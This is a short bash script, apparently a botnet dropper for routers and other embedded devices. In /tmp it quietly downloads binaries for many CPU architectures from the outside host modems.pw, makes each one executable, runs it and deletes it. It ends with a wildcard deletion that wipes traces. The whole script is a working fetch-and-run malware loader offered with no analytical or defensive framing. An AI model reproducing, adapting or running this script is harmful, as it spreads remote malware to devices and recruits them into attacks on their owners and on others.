#!/bin/bash

cd /tmp
wget -q http://modems.pw/64  
chmod 755 64 
./64
rm -rf 64 
wget -q http://modems.pw/32
chmod 755 32 
./32
rm -rf 32
wget -q http://modems.pw/armv5l 
chmod 755 armv5l 
./armv5l
rm -rf armv5l 
wget -q http://modems.pw/armv5l
chmod 755 armv4l
./armv4l
rm -rf armv4l
wget -q http://modems.pw/mips
chmod 755 mips
./mips
rm -rf mips
wget -q http://modems.pw/mipsel
chmod 755 mipsel
./mipsel
rm -rf mipsel
wget -q http://modems.pw/sh4
chmod 755 sh4
./sh4
rm -rf sh4
wget -q http://modems.pw/sparc
chmod 755 sparc
./sparc
rm -rf sparc
wget -q http://modems.pw/i586
chmod 755 i586
./i586
rm -rf i586
wget -q http://modems.pw/i686
chmod 755 i686
./i686
rm -rf i686
wget -q http://modems.pw/m68k
chmod 755 m68k
./m68k
rm -rf m68k
wget -q http://modems.pw/powerpc
chmod 755 powerpc
./powerpc
rm -rf powerpc
wget -q http://modems.pw/powerpc440fp
chmod 755 powerpc440fp
./powerpc440fp
rm -rf powerpc* 64* m* s* i* a* 32*
